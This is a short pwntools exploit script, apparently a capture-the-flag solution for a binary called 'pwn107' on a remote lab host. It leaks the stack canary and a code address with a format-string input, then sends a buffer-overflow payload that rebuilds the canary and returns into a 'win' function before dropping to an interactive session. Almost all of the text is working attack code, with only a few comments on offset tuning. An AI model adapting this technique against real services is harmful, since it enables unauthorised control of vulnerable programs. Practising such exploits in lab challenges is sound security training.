from pwn import *

context.binary = ELF("./pwn107.pwn107",checksec=False)

#p = process('pwn107.pwn107')
p = remote('10.10.90.31',9007)

#Getting canary and main address  :)
#This values can be different, maybe you'll need to change this 
# local the canary value in my machine is at %17$p
p.sendlineafter(b'streak? ',b'%13$p %19$p')
p.recvuntil(b'streak: ')

#split them and save all
canary,main = p.recvline().split()

canary = int(canary,16)
main = int(main,16)
win = main - 0x46
ret = main + 0x16e

#this give me a lot errors, i started with 40bytes and decreased by 2 bytes with each run until was worked with 24bytes
reach_canary = b'A'*24
reach_ret = b'A'*8
log.info(f'Canary: {hex(canary)}')
log.info(f'Main: {hex(main)}')
log.info(f'Win: {hex(win)}')
log.info(f'Ret: {hex(ret)}')


payload = b''
payload += reach_canary
payload	+= p64(canary)
payload += reach_ret
payload += p64(ret) #aleatory adress to function ret to avoid movaps
payload += p64(win) # Win adress

p.clean()
p.sendline(payload)

try:
	if p.recvuntil(b'again'):
		log.info(f'Exploited!')
		p.interactive()
except EOFError:
	log.info(f'Failed! Try changing the number of bytes in the reach_canary variable')
	p.close()
